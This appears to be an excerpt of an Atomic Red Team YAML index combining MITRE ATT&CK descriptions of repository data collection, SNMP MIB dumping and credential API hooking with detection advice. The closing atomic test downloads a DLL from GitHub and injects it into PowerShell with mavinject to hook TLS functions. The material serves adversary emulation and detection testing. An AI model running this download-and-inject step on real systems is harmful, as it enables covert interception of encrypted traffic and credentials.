      - source_name: Microsoft SharePoint Logging
        url: https://support.office.com/en-us/article/configure-audit-settings-for-a-site-collection-a9920c97-38c0-44f2-8bcb-4cf1e2ae22d2
        description: Microsoft. (2017, July 19). Configure audit settings for a site
          collection. Retrieved April 4, 2018.
      - source_name: Sharepoint Sharing Events
        url: https://docs.microsoft.com/en-us/microsoft-365/compliance/use-sharing-auditing?view=o365-worldwide#sharepoint-sharing-events
        description: Microsoft. (n.d.). Sharepoint Sharing Events. Retrieved October
          8, 2021.
      x_mitre_deprecated: false
      revoked: false
      description: "Adversaries may leverage information repositories to mine valuable
        information. Information repositories are tools that allow for storage of
        information, typically to facilitate collaboration or information sharing
        between users, and can store a wide variety of data that may aid adversaries
        in further objectives, or direct access to the target information. Adversaries
        may also abuse external sharing features to share sensitive documents with
        recipients outside of the organization. \n\nThe following is a brief list
        of example information that may hold potential value to an adversary and may
        also be found on an information repository:\n\n* Policies, procedures, and
        standards\n* Physical / logical network diagrams\n* System architecture diagrams\n*
        Technical system documentation\n* Testing / development credentials\n* Work
        / project schedules\n* Source code snippets\n* Links to network shares and
        other internal resources\n\nInformation stored in a repository may vary based
        on the specific instance or environment. Specific common information repositories
        include web-based platforms such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002)
        and [Confluence](https://attack.mitre.org/techniques/T1213/001), specific
        services such as Code Repositories, IaaS databases, enterprise databases,
        and other storage infrastructure such as SQL Server."
      modified: '2022-04-11T22:28:36.395Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Data from Information Repositories
      x_mitre_detection: "As information repositories generally have a considerably
        large user base, detection of malicious use can be non-trivial. At minimum,
        access to information repositories performed by privileged users (for example,
        Active Directory Domain, Enterprise, or Schema Administrators) should be closely
        monitored and alerted upon, as these types of accounts should generally not
        be used to access information repositories. If the capability exists, it may
        be of value to monitor and alert on users that are retrieving and viewing
        a large number of documents and pages; this behavior may be indicative of
        programmatic means being used to retrieve all data within the repository.
        In environments with high-maturity, it may be possible to leverage User-Behavioral
        Analytics (UBA) platforms to detect and alert on user based anomalies.\n\nThe
        user access logging within Microsoft's SharePoint can be configured to report
        access to certain pages and documents. (Citation: Microsoft SharePoint Logging)
        Sharepoint audit logging can also be configured to report when a user shares
        a resource. (Citation: Sharepoint Sharing Events) The user access logging
        within Atlassian's Confluence can also be configured to report access to certain
        pages and documents through AccessLogFilter. (Citation: Atlassian Confluence
        Logging) Additional log storage and analysis infrastructure will likely be
        required for more robust detection capabilities. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      - 'Logon Session: Logon Session Creation'
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1602.001:
    technique:
      x_mitre_platforms:
      - Network
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--ee7ff928-801c-4f34-8a99-3df965e581a5
      type: attack-pattern
      created: '2020-10-19T23:51:05.953Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1602.001
        url: https://attack.mitre.org/techniques/T1602/001
      - source_name: SANS Information Security Reading Room Securing SNMP Securing
          SNMP
        url: https://www.sans.org/reading-room/whitepapers/networkdevs/securing-snmp-net-snmp-snmpv3-1051
        description: 'Michael Stump. (2003). Information Security Reading Room Securing
          SNMP: A Look atNet-SNMP (SNMPv3). Retrieved October 19, 2020.'
      - source_name: US-CERT-TA18-106A
        url: https://www.us-cert.gov/ncas/alerts/TA18-106A
        description: US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored
          Cyber Actors Targeting Network Infrastructure Devices. Retrieved October
          19, 2020.
      - source_name: Cisco Blog Legacy Device Attacks
        url: https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954
        description: Omar Santos. (2020, October 19). Attackers Continue to Target
          Legacy Devices. Retrieved October 20, 2020.
      - source_name: Cisco Advisory SNMP v3 Authentication Vulnerabilities
        url: https://tools.cisco.com/security/center/content/CiscoAppliedMitigationBulletin/cisco-amb-20080610-SNMPv3
        description: Cisco. (2008, June 10). Identifying and Mitigating Exploitation
          of the SNMP Version 3 Authentication Vulnerabilities. Retrieved October
          19, 2020.
      modified: '2020-10-22T01:54:22.812Z'
      name: SNMP (MIB Dump)
      description: "Adversaries may target the Management Information Base (MIB) to
        collect and/or mine valuable information in a network managed using Simple
        Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository
        that stores variable information accessible via SNMP in the form of object
        identifiers (OID). Each OID identifies a variable that can be read or set
        and permits active management tasks, such as configuration changes, through
        remote modification of these variables. SNMP can give administrators great
        insight in their systems, such as, system information, description of hardware,
        physical location, and software packages(Citation: SANS Information Security
        Reading Room Securing SNMP Securing SNMP). The MIB may also contain device
        operational information, including running configuration, routing table, and
        interface details.\n\nAdversaries may use SNMP queries to collect MIB content
        directly from SNMP-managed devices in order to collect network information
        that allows the adversary to build network maps and facilitate future targeted
        exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device
        Attacks) "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_detection: 'Identify network traffic sent or received by untrusted hosts
        or networks that expose MIB content or use unauthorized protocols.(Citation:
        Cisco Advisory SNMP v3 Authentication Vulnerabilities)'
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Connection Creation'
      x_mitre_permissions_required:
      - Administrator
    atomic_tests: []
  T1056.004:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--f5946b5e-9408-485f-a7f7-b5efc88909b6
      type: attack-pattern
      created: '2020-02-11T19:01:15.930Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1056.004
        url: https://attack.mitre.org/techniques/T1056/004
      - source_name: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017
        description: Microsoft. (2017, September 15). TrojanSpy:Win32/Ursnif.gen!I.
          Retrieved December 18, 2017.
        url: https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=TrojanSpy:Win32/Ursnif.gen!I&threatId=-2147336918
      - url: https://msdn.microsoft.com/library/windows/desktop/ms644959.aspx
        description: Microsoft. (n.d.). Hooks Overview. Retrieved December 12, 2017.
        source_name: Microsoft Hook Overview
      - url: https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
        description: 'Hosseini, A. (2017, July 18). Ten Process Injection Techniques:
          A Technical Survey Of Common And Trending Process Injection Techniques.
          Retrieved December 7, 2017.'
        source_name: Elastic Process Injection July 2017
      - url: https://www.adlice.com/userland-rootkits-part-1-iat-hooks/
        description: 'Tigzy. (2014, October 15). Userland Rootkits: Part 1, IAT hooks.
          Retrieved December 12, 2017.'
        source_name: Adlice Software IAT Hooks Oct 2014
      - url: https://www.mwrinfosecurity.com/our-thinking/dynamic-hooking-techniques-user-mode/
        description: 'Hillman, M. (2015, August 8). Dynamic Hooking Techniques: User
          Mode. Retrieved December 20, 2017.'
        source_name: MWRInfoSecurity Dynamic Hooking 2015
      - url: https://www.exploit-db.com/docs/17802.pdf
        description: Mariani, B. (2011, September 6). Inline Hooking in Windows. Retrieved
          December 12, 2017.
        source_name: HighTech Bridge Inline Hooking Sept 2011
      - url: https://volatility-labs.blogspot.com/2012/09/movp-31-detecting-malware-hooks-in.html
        description: Volatility Labs. (2012, September 24). MoVP 3.1 Detecting Malware
          Hooks in the Windows GUI Subsystem. Retrieved December 12, 2017.
        source_name: Volatility Detecting Hooks Sept 2012
      - url: https://github.com/prekageo/winhook
        description: Prekas, G. (2011, July 11). Winhook. Retrieved December 12, 2017.
        source_name: PreKageo Winhook Jul 2011
      - url: https://github.com/jay/gethooks
        description: Satiro, J. (2011, September 14). GetHooks. Retrieved December
          12, 2017.
        source_name: Jay GetHooks Sept 2011
      - url: https://zairon.wordpress.com/2006/12/06/any-application-defined-hook-procedure-on-my-machine/
        description: Felici, M. (2006, December 6). Any application-defined hook procedure
          on my machine?. Retrieved December 12, 2017.
        source_name: Zairon Hooking Dec 2006
      - url: https://eyeofrablog.wordpress.com/2017/06/27/windows-keylogger-part-2-defense-against-user-land/
        description: 'Eye of Ra. (2017, June 27). Windows Keylogger Part 2: Defense
          against user-land. Retrieved December 12, 2017.'
        source_name: EyeofRa Detecting Hooking June 2017
      - url: http://www.gmer.net/
        description: GMER. (n.d.). GMER. Retrieved December 12, 2017.
        source_name: GMER Rootkits
      - url: https://msdn.microsoft.com/library/windows/desktop/ms686701.aspx
        description: Microsoft. (n.d.). Taking a Snapshot and Viewing Processes. Retrieved
          December 12, 2017.
        source_name: Microsoft Process Snapshot
      - url: https://security.stackexchange.com/questions/17904/what-are-the-methods-to-find-hooked-functions-and-apis
        description: Stack Exchange - Security. (2012, July 31). What are the methods
          to find hooked functions and APIs?. Retrieved December 12, 2017.
        source_name: StackExchange Hooks Jul 2012
      modified: '2020-11-10T18:29:31.138Z'
      name: 'Input Capture: Credential API Hooking'
      description: |
        Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001),  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:

        * **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection July 2017)
        * **Import address table (IAT) hooking**, which use modifications to a processs IAT, where pointers to imported API functions are stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)
        * **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: |-
        Monitor for calls to the `SetWindowsHookEx` and `SetWinEventHook` functions, which install a hook procedure.(Citation: Microsoft Hook Overview)(Citation: Volatility Detecting Hooks Sept 2012) Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools(Citation: Volatility Detecting Hooks Sept 2012)(Citation: PreKageo Winhook Jul 2011)(Citation: Jay GetHooks Sept 2011) or by programmatically examining internal kernel structures.(Citation: Zairon Hooking Dec 2006)(Citation: EyeofRa Detecting Hooking June 2017)

        Rootkits detectors(Citation: GMER Rootkits) can also be used to monitor for various types of hooking activity.

        Verify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes(Citation: Microsoft Process Snapshot) to compare the in-memory IAT to the real addresses of the referenced functions.(Citation: StackExchange Hooks Jul 2012)(Citation: Adlice Software IAT Hooks Oct 2014)
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Process: OS API Execution'
      - 'Process: Process Metadata'
      x_mitre_permissions_required:
      - Administrator
      - SYSTEM
      identifier: T1056.004
    atomic_tests:
    - name: Hook PowerShell TLS Encrypt/Decrypt Messages
      auto_generated_guid: de1934ea-1fbf-425b-8795-65fb27dd7e33
      description: 'Hooks functions in PowerShell to read TLS Communications

        '
      supported_platforms:
      - windows
      input_arguments:
        file_name:
          description: Dll To Inject
          type: path
          default: PathToAtomicsFolder\T1056.004\bin\T1056.004x64.dll
        server_name:
          description: TLS Server To Test Get Request
          type: url
          default: https://www.example.com
      dependency_executor_name: powershell
      dependencies:
      - description: 'T1056.004x64.dll must exist on disk at specified location (#{file_name})

          '
        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}" -UseBasicParsing
      executor:
        command: |
          mavinject $pid /INJECTRUNNING #{file_name}
          Invoke-WebRequest #{server_name} -UseBasicParsing
        name: powershell
        elevation_required: true
